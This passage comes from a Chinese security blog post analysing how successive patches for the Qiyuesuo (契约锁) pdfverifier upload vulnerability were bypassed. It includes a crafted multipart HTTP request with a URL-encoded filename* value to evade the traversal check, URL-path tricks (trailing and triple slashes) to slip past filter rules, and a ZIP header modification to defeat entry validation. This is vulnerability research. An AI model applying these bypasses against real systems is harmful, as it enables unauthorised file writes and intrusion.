class="keyword">void</span> <span class="title function_">decodeRsc</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileName);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(file));</span><br><span class="line">        String line;</span><br><span class="line">        Map&lt;String, List&lt;String&gt;&gt; SECURITY_SRC_MAP = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            String[] parts = line.split(<span class="string">&quot;:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (parts.length == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> parts[<span class="number">0</span>].trim();</span><br><span class="line">                <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> parts[<span class="number">1</span>].trim();</span><br><span class="line">                List&lt;String&gt; decodedValueList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                String[] encodedValueList = value.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (String encodeValue : encodedValueList) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">decodeValue</span> <span class="operator">=</span> RSAUtils.decryptByDefaultPrivateKey(encodeValue);</span><br><span class="line">                    decodedValueList.add(decodeValue.trim());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">decodedKey</span> <span class="operator">=</span> RSAUtils.decryptByDefaultPrivateKey(key);</span><br><span class="line">                SECURITY_SRC_MAP.put(decodedKey, decodedValueList);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, List&lt;String&gt;&gt; entry : SECURITY_SRC_MAP.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            List&lt;String&gt; valueList = entry.getValue();</span><br><span class="line">            System.out.println(<span class="string">&quot;Key: &quot;</span> + key);</span><br><span class="line">            <span class="keyword">for</span> (String value : valueList) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Value: &quot;</span> + value);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;===================&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3-2"><a href="#1-3-2" class="headerlink" title="1.3.2"></a>1.3.2</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>补丁包里主要的过滤代码应该在filter里：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761911891516-245daf88-118a-495d-ba9f-a96a6692ba99.png"  alt="img"></p>
+<p>logic里面是过滤逻辑；wrapper是包装类，一般用于过滤某一类请求。</p>
+<p>QvdLogicManager会被QvdFilter调用，负责遍历每一个logic：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761912068765-4ff829ef-2e09-47f7-8aff-d92fcc9c170c.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761911980456-c3b3f867-4e7e-4789-a0a0-5bf271fb0692.png"  alt="img"></p>
+<p>用idea自带的功能对比1.3.1和1.3.2的patchJar，找到修复点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762137843320-4e70f6ea-353a-42d3-bba6-e11c94f159c9.png"  alt="img"></p>
+<p>PdfverifierPreventLogic这里先对路由进行匹配，匹配成功的，会用PdfverifierPreventWrapper对request进行包装：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761912206063-0e1749cd-7118-4683-b0cf-01ed24839275.png"  alt="img"></p>
+<p>走完所有的filter后，就会进入springboot的处理逻辑，就是DispatcherServlet.doDispatcher里的那一套。里面会先处理上传的文件，最终走到补丁里添加的com.qiyuesuo.security.patch.filter.wrapper.PdfverifierPreventWrapper#getParts：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761912519432-2a1e08bd-018a-44a1-accc-cdaed5a6ff77.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761913874929-75a82c16-6b9a-4fb5-8c3d-d9aff4170b16.png"  alt="img"></p>
+<p>只有当filename结尾为ofd时，才会进入if逻辑，判断是否有穿越符。但是我们又必须保证在最终的verify方法里，文件后缀为ofd，这样才能触发解压穿越。这里使用url编码绕过。</p>
+<p>PdfverifierPreventWrapper#getParts调用org.apache.catalina.core.ApplicationPart#getSubmittedFileName进行文件名解析，不会进行URL解码：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761913649212-bd7398b5-8373-475d-9065-af07008c2630.png"  alt="img"></p>
+<p>但是springboot的org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest会解码：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761913696295-835b04d1-a0d9-4dfb-a62f-96e06f279567.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761913734096-5a7439ba-6fdc-4700-953e-34ecd23a2d3c.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761913784161-1d745e11-febb-49a0-a01b-f4dacd965662.png"  alt="img"></p>
+<p>所以可以通过URL编码来实现绕过。</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/pdfverifier</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:9180</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.32.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>302</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=3bd5f90d2232775f31d7948a090430c8</span><br><span class="line"></span><br><span class="line"><span class="language-perl">--3bd5f90d2232775f31d7948a090430c8</span></span><br><span class="line"><span class="language-perl">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename*=<span class="string">&quot;<span class="variable">%6</span>2<span class="variable">%6</span>1<span class="variable">%6</span>4%2e%6f<span class="variable">%6</span>6<span class="variable">%64</span>&quot;</span></span></span><br><span class="line"><span class="language-perl"></span></span><br><span class="line"><span class="language-perl">PKxxx</span></span><br></pre></td></tr></table></figure>
+
+<p>filename后面有个*，这样才能进入springboot的url解码逻辑。</p>
+<h2 id="1-3-3-1-3-5"><a href="#1-3-3-1-3-5" class="headerlink" title="1.3.3-1.3.5"></a>1.3.3-1.3.5</h2><p>这里我们直接对比1.3.5和1.3.6，看看修复点在哪里：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762140004112-de2c38ba-20df-46e4-aa04-64263e3cf2f9.png"  alt="img"></p>
+<p>这里在URL处理时，移除了末尾的斜杠。而原本的逻辑，只是将&#x2F;&#x2F;替换成&#x2F;。</p>
+<p>我们看一下uriProcessor这个方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762140127679-7ff378f0-590f-4633-86df-96a174e399ad.png"  alt="img"></p>
+<p>首先能够发现，这个方法在各个Logic里面都会使用，用来从request里面解析url。解析URL是通过request.getRequestURI获取，所以这里能想到一些绕过，比如：</p>
+<ul>
+<li>&#x2F;api&#x2F;;&#x2F;pdfverifier</li>
+<li>&#x2F;api&#x2F;.&#x2F;pdfverifier</li>
+<li>&#x2F;&#x2F;&#x2F;api&#x2F;pdfverifier</li>
+</ul>
+<p>但是，在PdfLogic前，还有一个DangerUrlLogic，会对URL里的一些敏感字符进行拦截：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762145568028-435547ad-7622-4d04-944a-343507208a7f.png"  alt="img"></p>
+<p>不允许出现&#x2F;&#x2F;，.&#x2F;，;</p>
+<p>所以得想其他的方法去绕过。</p>
+<p>这里用到的就是Spring的路由解析特性，在最后加一个斜杠照样能访问到。</p>
+<p>所以绕过为：api&#x2F;pdfverifier&#x2F;</p>
+<p>这样就不会匹配PDFVERIFIER_URL_LIST：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762145757142-51b8756f-2887-48f1-ac31-226c3a268543.png"  alt="img"></p>
+<p>下面的截图是解密后的security.rsc</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762145768667-91930df2-d842-4945-86cf-284f0f6d481d.png"  alt="img"></p>
+<h2 id="1-3-6"><a href="#1-3-6" class="headerlink" title="1.3.6"></a>1.3.6</h2><p>对比1.3.6和1.3.7，看看1.3.6的绕过点是怎么修的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762146545337-ac68df78-2cb6-4d04-a859-1535e33bf621.png"  alt="img"></p>
+<p>1.3.6是将双斜杠换成单斜杠，1.3.7将任意多个斜杠，都替换成单斜杠。</p>
+<p>这里的绕过是三斜杠绕过，即在路由末尾添加三个斜杠。但是前面讲过，DangerUrlLogic应该会拦截双斜杠才对，三斜杠理应也被拦截，那么为什么这里又可以了呢？</p>
+<p>再看一下uriProcess方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762146803095-286dec6f-014f-4d6f-a4a1-2aebdaacef69.png"  alt="img"></p>
+<p>最后是先替换双斜杠为单斜杠，然后再去除末尾的斜杠。</p>
+<p>那么，&#x2F;&#x2F;&#x2F;最终就会变成&#x2F;，这样就跟1.3.5的绕过一样了。</p>
+<h2 id="1-3-7"><a href="#1-3-7" class="headerlink" title="1.3.7"></a>1.3.7</h2><p>和1.3.8补丁对比：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762148617184-9361334a-c416-4cca-8aee-cf22ae7c4c15.png"  alt="img"></p>
+<p>可以发现，原本的zis.getNextEntry被修改成takeentrie.hasMoreElements()了。而takeentrie.hasMoreElements()和后面pdfverifierController那边的解压逻辑是一样的。那是不是可以说明，能够制作一个压缩包，能够使zis.getNextEntry为null，且在后面正常解压？</p>
+<p>我们跟进zis.getNextEntry，去看看怎么样才能返回null：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762148780896-91924f99-8786-4dd5-a1e7-4b1363785b20.png"  alt="img"></p>
+<p>重点在readLOC，跟进：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762148810455-57300f16-1cba-46ce-b930-ae3b4ec80493.png"  alt="img"></p>
+<p>这里其实是读取文件头等信息的方法，可以问一下AI，怎么样才能返回null：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762149063057-5be7f2fa-698d-4941-8c23-c006c97e515b.png"  alt="img"></p>
+<p>所以我们可以修改文件头：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762151100920-b58433f1-ac2a-4964-a83e-e8f13f5de366.png"  alt="img"></p>
+<p>任意加两个字符即可，不会影响解压。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次新学的知识：</p>
+<p>1、热加载触发恶意类</p>
+<p>2、使用进程监视器观察热加载过程</p>
+<p>3、URL解析差异导致的鉴权绕过</p>
+<p>说实话，绕过里手法很多都是第一次见，以后得专门学一下URL解析差异导致的绕过</p>
+<p>另外，如果自己去挖掘新漏洞，应该如何下手？</p>
+<p>之前挖u8cloud时，是个spring mvc项目，几个入口路由都写在web.xml里了，难点在于搞清楚每个路由能调用哪些jar里的类，以及怎么去请求到具体的方法。</p>
+<p>而契约锁是个springboot项目，主要的jar只有几个，无需鉴权的url也写在config类里了。现在的问题是，怎么筛选出对应的类？另外，这里的鉴权和过滤，大部分都不是直接在controller中处理的，而是在各种filter中。那么，要怎么知道你的请求会被哪些filter处理？</p>
+<p>总之，大一点的springboot项目还有很多不熟悉的，尤其是在鉴权方面。之后有空得补一下开发相关的内容。</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                契约锁pdfverifier漏洞分析
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/11/03/契约锁pdfverifier漏洞分析/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-11-03 16:16</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java/">Java</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/10/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8E%A2%E6%B5%8B/"
+                                   title="Java反序列化链探测"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Java反序列化链探测</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%9B%AE%E5%BD%95%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">应用目录分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">补丁结构分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#idea%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA"><span class="nav-number">2.3.</span> <span class="nav-text">idea项目搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">2.4.</span> <span class="nav-text">注意事项</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">路由分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99"><span class="nav-number">4.1.</span> <span class="nav-text">任意写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%AD%E5%8A%A0%E8%BD%BD%E8%A1%A5%E4%B8%81"><span class="nav-number">4.2.</span> <span class="nav-text">热加载补丁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%9A%E6%AC%A1%E7%83%AD%E5%8A%A0%E8%BD%BD%EF%BC%9F"><span class="nav-number">4.3.</span> <span class="nav-text">多次热加载？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">补丁分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#security-rsc"><span class="nav-number">6.1.</span> <span class="nav-text">security.rsc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-2"><span class="nav-number">6.2.</span> <span class="nav-text">1.3.2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">6.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">6.2.2.</span> <span class="nav-text">绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-3-1-3-5"><span class="nav-number">6.3.</span> <span class="nav-text">1.3.3-1.3.5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-6"><span class="nav-number">6.4.</span> <span class="nav-text">1.3.6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-7"><span class="nav-number">6.5.</span> <span class="nav-text">1.3.7</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">84k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%9B%AE%E5%BD%95%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">应用目录分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">补丁结构分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#idea%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA"><span class="nav-number">2.3.</span> <span class="nav-text">idea项目搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">2.4.</span> <span class="nav-text">注意事项</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">路由分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99"><span class="nav-number">4.1.</span> <span class="nav-text">任意写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%AD%E5%8A%A0%E8%BD%BD%E8%A1%A5%E4%B8%81"><span class="nav-number">4.2.</span> <span class="nav-text">热加载补丁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%9A%E6%AC%A1%E7%83%AD%E5%8A%A0%E8%BD%BD%EF%BC%9F"><span class="nav-number">4.3.</span> <span class="nav-text">多次热加载？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">补丁分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#security-rsc"><span class="nav-number">6.1.</span> <span class="nav-text">security.rsc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-2"><span class="nav-number">6.2.</span> <span class="nav-text">1.3.2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">6.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">6.2.2.</span> <span class="nav-text">绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-3-1-3-5"><span class="nav-number">6.3.</span> <span class="nav-text">1.3.3-1.3.5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-6"><span class="nav-number">6.4.</span> <span class="nav-text">1.3.6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-7"><span class="nav-number">6.5.</span> <span class="nav-text">1.3.7</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
